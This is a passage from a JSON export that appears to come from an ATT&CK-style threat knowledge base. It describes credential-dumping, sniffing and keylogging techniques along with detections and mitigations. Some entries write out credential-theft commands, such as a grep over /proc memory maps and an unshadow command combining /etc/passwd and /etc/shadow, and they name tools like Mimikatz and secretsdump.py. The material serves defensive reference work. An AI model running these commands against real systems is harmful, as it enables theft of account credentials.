the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised Valid Accounts in-use by adversaries may help as well.","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Access","Windows Registry: Windows Registry Key Access","File: File Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1028","name":"Operating System Configuration","description":"Consider disabling or restricting NTLM. <a href=\"https://technet.microsoft.com/library/jj865668.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable NTLM Nov 2012)</a>"}]},{"id":"T1003.003","name":"NTDS","description":"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller. <a href=\"https://en.wikipedia.org/wiki/Active_Directory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Active Directory)</a>\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information. <a href=\"http://adsecurity.org/?p=1275\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metcalf 2015)</a>\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure Domain Controller backups are properly secured. <a href=\"http://adsecurity.org/?p=1275\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metcalf 2015)</a>"}]},{"id":"T1003.004","name":"LSA Secrets","description":"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. <a href=\"https://www.passcape.com/index.php?section=docsys&cmd=details&id=23\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Passcape LSA Secrets)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD Admin Tier Model)</a> <a href=\"https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury Windows Credentials)</a> LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory. <a href=\"https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ired Dumping LSA Secrets)</a>\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory. <a href=\"https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ired Dumping LSA Secrets)</a>","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Access","Command: Command Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury Windows Credentials)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."}]},{"id":"T1003.005","name":"Cached Domain Credentials","description":"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Cached Creds)</a>\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. <a href=\"https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PassLib mscache)</a> The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password. <a href=\"https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ired mscache)</a>\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at <code>/var/lib/sss/db/cache.[domain].ldb</code> for SSSD or <code>/var/opt/quest/vas/authcache/vas_auth.vdb</code> for Quest. Adversaries can use utilities, such as <code>tdbdump</code>, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a> \n\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a>\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2. <a href=\"https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PassLib mscache)</a>","detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised Valid Accounts in-use by adversaries may help as well.","platforms":["Windows","Linux"],"dataSources":["Command: Command Execution"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Consider adding users to the \"Protected Users\" Active Directory security group. This can help limit the caching of users' plaintext credentials. <a href=\"https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected Users Security Group)</a>"},{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1028","name":"Operating System Configuration","description":"Consider limiting the number of cached credentials (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Current Version\\Winlogon\\cachedlogonscountvalue) <a href=\"https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury Windows Credentials)</a>"}]},{"id":"T1003.006","name":"DCSync","description":"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API) <a href=\"https://msdn.microsoft.com/library/cc228086.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DRSR Dec 2017)</a> <a href=\"https://msdn.microsoft.com/library/dd207691.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetNCCChanges)</a> <a href=\"https://wiki.samba.org/index.php/DRSUAPI\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Samba DRSUAPI)</a> <a href=\"https://source.winehq.org/WineAPI/samlib.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wine API samlib.dll)</a> to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data <a href=\"https://adsecurity.org/?p=1729\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Mimikatz DCSync)</a> from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket <a href=\"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Mimikatz and DCSync)</a> or change an account's password as noted in Account Manipulation. <a href=\"https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: InsiderThreat ChangeNTLM July 2017)</a>\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. <a href=\"https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Mimikatz lsadump Module)</a> Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. <a href=\"https://msdn.microsoft.com/library/cc237008.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft NRPC Dec 2017)</a>","detection":"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. <a href=\"https://msdn.microsoft.com/library/cc228086.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DRSR Dec 2017)</a> <a href=\"https://msdn.microsoft.com/library/dd207691.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetNCCChanges)</a> <a href=\"https://wiki.samba.org/index.php/DRSUAPI\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Samba DRSUAPI)</a> Also monitor for network protocols <a href=\"https://msdn.microsoft.com/library/cc228086.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DRSR Dec 2017)</a> <a href=\"https://msdn.microsoft.com/library/cc237008.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft NRPC Dec 2017)</a> and other replication requests <a href=\"https://msdn.microsoft.com/library/cc245496.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SAMR)</a> from IPs not associated with known domain controllers. <a href=\"https://adsecurity.org/?p=1729\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity DCSync Sept 2015)</a>\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account. <a href=\"http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y DCSync Sept 2015)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Access","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Manage the access control list for \"Replicating Directory Changes\" and other permissions associated with domain controller replication. <a href=\"https://adsecurity.org/?p=1729\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Mimikatz DCSync)</a> <a href=\"https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replication ACL)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."}]},{"id":"T1003.007","name":"Proc Filesystem","description":"Adversaries may gather credentials from the proc filesystem or <code>/proc</code>. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the <code>/proc/&lt;PID&gt;/maps</code> file shows how memory is mapped within the process’s virtual address space. And <code>/proc/&lt;PID&gt;/mem</code>, exposed for debugging purposes, provides access to the process’s virtual address space. <a href=\"https://www.picussecurity.com/resource/the-mitre-attck-t1003-os-credential-dumping-technique-and-its-adversary-use\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Picus Labs Proc cump 2022)</a> <a href=\"https://www.baeldung.com/linux/proc-id-maps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: baeldung Linux proc map 2022)</a>\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. <a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: atomic-red proc file system)</a> When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory. <a href=\"https://github.com/huntergregal/mimipenguin\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MimiPenguin GitHub May 2017)</a> <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-usdpid-maps-and-proc-usdpid-mem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Polop Linux PrivEsc Gitbook)</a>\n\nIf running as or with the permissions of a web browser, a process can search the <code>/maps</code> &amp; <code>/mem</code> locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.","detection":"To obtain the passwords and hashes stored in memory, processes must open a maps file in the <code>/proc</code> filesystem for the process being analyzed. This file is stored under the path <code>/proc/PID/maps</code>, where the <code>PID</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":["Linux"],"dataSources":["Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing sensitive information."},{"id":"M1027","name":"Password Policies","description":"Ensure that root accounts have complex, unique passwords across all systems on the network."}]},{"id":"T1003.008","name":"/etc/passwd and /etc/shadow","description":"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user. <a href=\"https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Password and Shadow File Formats)</a>\n\nLinux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A \"user\" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts. <a href=\"https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Password and Shadow File Formats)</a>\n\nAdversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command. <a href=\"https://arcticwolf.com/resources/blog/arctic-wolf-observes-threat-campaign-targeting-palo-alto-networks-firewall-devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arctic Wolf)</a> Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow &gt; /tmp/crack.password.db</code> <a href=\"https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: nixCraft - John the Ripper)</a>. Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.","detection":"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.","platforms":["Linux"],"dataSources":["File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive information."},{"id":"M1027","name":"Password Policies","description":"Ensure that root accounts have complex, unique passwords across all systems on the network."}]}]},{"id":"T1040","name":"Network Sniffing","description":"Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as Name Resolution Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Stealth activities. Adversaries may likely also utilize network sniffing during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. <a href=\"https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Traffic Mirroring)</a> <a href=\"https://cloud.google.com/vpc/docs/packet-mirroring\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Packet Mirroring)</a> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Virtual Network TAP)</a> Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. <a href=\"https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)</a> <a href=\"https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps AWS Traffic Mirroring)</a> The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. <a href=\"https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)</a>\n\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as <code>monitor capture</code>. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: capture_embedded_packet_on_software)</a>","detection":"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a Adversary-in-the-Middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\nIn cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.","platforms":["IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."},{"id":"M1030","name":"Network Segmentation","description":"Deny direct access of broadcasts and multicast sniffing, and prevent attacks such as Name Resolution Poisoning and SMB Relay"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication wherever possible."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."}],"subTechniques":[]},{"id":"T1056","name":"Input Capture","description":"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).","detection":"Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. <code>SetWindowsHook</code>, <code>GetKeyState</code>, and <code>GetAsyncKeyState</code>) <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a>, monitoring for malicious instances of Command and Scripting Interpreter, and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Modification","Process: Process Creation","Windows Registry: Windows Registry Key Modification","Process: Process Metadata","Process: OS API Execution","Driver: Driver Load"],"mitigations":[],"subTechniques":[{"id":"T1056.001","name":"Keylogging","description":"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems. <a href=\"https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Kimsuky Nov 2021)</a>\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a> Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include <code>SetWindowsHook</code>, <code>GetKeyState</code>, and <code>GetAsyncKeyState</code>. <a href=\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adventures of a Keystroke)</a> Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Driver: Driver Load","Process: OS API Execution","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1056.002","name":"GUI Input Capture","description":"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. <a href=\"https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Exploits MacKeeper)</a> This type of prompt can be used to collect credentials via various languages such as AppleScript <a href=\"https://logrhythm.com/blog/do-you-trust-your-computer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogRhythm Do You Trust Oct 2014)</a> <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> and PowerShell. <a href=\"https://logrhythm.com/blog/do-you-trust-your-computer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogRhythm Do You Trust Oct 2014)</a> <a href=\"https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Phishing for Credentials Jan 2015)</a> <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell). <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a>\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.","detection":"Monitor process execution for unusual programs as well as malicious instances of Command and Scripting Interpreter that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious. <a href=\"https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Spoofing credential dialogs)</a> \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.","platforms":["Linux","macOS","Windows"],"dataSources":["Script: Script Execution","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Use user training as a way to bring awareness and raise suspicion for potentially malicious events and dialog boxes (ex: Office documents prompting for credentials)."}]},{"id":"T1056.003","name":"Web Portal Capture","description":"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. <a href=\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Virtual Private Keylogging)</a>","detection":"File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow administrator accounts that have permissions to modify the Web content of organization login portals to be used for day-to-day operations that may expose 